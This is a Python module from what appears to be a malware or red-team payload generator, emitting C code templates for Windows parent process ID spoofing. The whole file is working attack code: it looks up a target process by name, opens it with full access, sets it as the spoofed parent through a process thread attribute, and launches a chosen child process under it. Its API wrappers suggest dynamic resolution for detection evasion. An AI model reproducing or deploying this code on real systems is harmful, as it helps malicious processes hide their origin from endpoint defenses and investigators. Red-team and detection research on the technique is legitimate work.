from code_templates import headers
from code_templates import winapi

def classic(parentProcessName, childProcessToLaunch):
    requiredHeaders = []
    requiredHeaders.append(headers.TLHELP32_H)
    requiredHeaders.append(headers.SKERNEL32)

    requiredWinAPIs = []
    requiredWinAPIs.append(winapi.CREATE_PROCESS)
    requiredWinAPIs.append(winapi.CREATE_TOOL_HELP_32_SNAPSHOT)
    requiredWinAPIs.append(winapi.PROCESS_32_FIRST)
    requiredWinAPIs.append(winapi.PROCESS_32_NEXT)
    requiredWinAPIs.append(winapi.CLOSE_HANDLE)
    requiredWinAPIs.append(winapi.INITIALIZE_PROC_THREAD_ATTRIBUTE_LIST)
    requiredWinAPIs.append(winapi.UPDATE_PROC_THREAD_ATTRIBUTE)
    requiredWinAPIs.append(winapi.DELETE_PROC_THREAD_ATTRIBUTE_LIST)
    requiredWinAPIs.append(winapi.HEAP_ALLOC)
    requiredWinAPIs.append(winapi.OPEN_PROCESS)


    codeBase = """
DWORD GetPidByName(const char * pName) {
    PROCESSENTRY32 pEntry;
    HANDLE snapshot;

    pEntry.dwSize = sizeof(PROCESSENTRY32);
    snapshot = CreateToolhelp32Snapshot_p(TH32CS_SNAPPROCESS, 0);

    if (Process32First_p(snapshot, &pEntry) == TRUE) {
        while (Process32Next_p(snapshot, &pEntry) == TRUE) {
            if (_stricmp(pEntry.szExeFile, pName) == 0) {
                return pEntry.th32ProcessID;
            }
        }
    }
    CloseHandle_p(snapshot);
    return 0;
}
    """

    main = """
    void * exec_mem;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;

    STARTUPINFOEX info = {{ sizeof(info) }};
    PROCESS_INFORMATION processInfo;
    SIZE_T cbAttributeListSize = 0;
    PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = NULL;
    HANDLE hParentProcess = NULL;
    DWORD dwPid = 0;
    
    dwPid = GetPidByName("{parentProcessName}");
    if (dwPid == 0)
            dwPid = GetCurrentProcessId();

    // create fresh attributelist
    InitializeProcThreadAttributeList_p(NULL, 1, 0, &cbAttributeListSize);
    pAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST) HeapAlloc_p(GetProcessHeap(), 0, cbAttributeListSize);
    InitializeProcThreadAttributeList_p(pAttributeList, 1, 0, &cbAttributeListSize);

    // copy and spoof parent process ID
    hParentProcess = OpenProcess_p(PROCESS_ALL_ACCESS, FALSE, dwPid);
    UpdateProcThreadAttribute_p(pAttributeList,
                            0,
                            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                            &hParentProcess,
                            sizeof(HANDLE),
                            NULL,
                            NULL);

    info.lpAttributeList = pAttributeList;
    
    // launch new process with different parent
    CreateProcessA_p(NULL,
                    (LPSTR) "{childProcessToLaunch}",
                    NULL,
                    NULL,
                    FALSE,
                    EXTENDED_STARTUPINFO_PRESENT,
                    NULL,
                    NULL,
                    &info.StartupInfo,
                    &processInfo);

    DeleteProcThreadAttributeList_p(pAttributeList);
    CloseHandle_p(hParentProcess);
    """.format(parentProcessName=parentProcessName, childProcessToLaunch=childProcessToLaunch)

    return requiredHeaders, requiredWinAPIs, codeBase, main